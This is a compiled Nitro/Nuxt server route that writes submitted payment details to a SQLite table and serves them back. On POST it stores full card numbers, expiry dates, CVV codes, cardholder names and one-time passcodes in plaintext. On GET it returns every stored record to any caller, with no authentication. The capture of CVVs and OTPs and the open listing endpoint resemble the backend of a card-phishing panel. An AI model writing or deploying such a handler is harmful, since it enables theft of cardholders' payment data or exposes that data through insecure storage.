import { d as defineEventHandler, r as readBody, c as createError } from '../../../_/nitro.mjs';
import db from '../../../_/db.mjs';
import 'node:http';
import 'node:https';
import 'node:events';
import 'node:buffer';
import 'node:fs';
import 'node:path';
import 'node:crypto';
import 'node:url';
import 'better-sqlite3';
import 'path';

const payments = defineEventHandler(async (event) => {
  const method = event.method;
  if (method === "GET") {
    try {
      const stmt = db.prepare(
        "SELECT * FROM payment_info ORDER BY created_at DESC"
      );
      const payments = stmt.all();
      return payments;
    } catch {
    }
  }
  if (method === "POST") {
    try {
      const body = await readBody(event);
      const {
        method: paymentMethod,
        card_number,
        expiry,
        cvv,
        cardholder_name,
        otp
      } = body;
      if (!paymentMethod) {
        throw createError({
          statusCode: 400,
          statusMessage: "Payment method is required"
        });
      }
      const stmt = db.prepare(`
        INSERT INTO payment_info (method, card_number, expiry, cvv, cardholder_name, otp, status)
        VALUES (?, ?, ?, ?, ?, ?, 'pending')
      `);
      const result = stmt.run(
        paymentMethod,
        card_number,
        expiry,
        cvv,
        cardholder_name,
        otp
      );
      const newPayment = db.prepare("SELECT * FROM payment_info WHERE id = ?").get(result.lastInsertRowid);
      return newPayment;
    } catch {
    }
  }
  throw createError({
    statusCode: 405,
    statusMessage: "Method not allowed"
  });
});

export { payments as default };
//# sourceMappingURL=payments.mjs.map
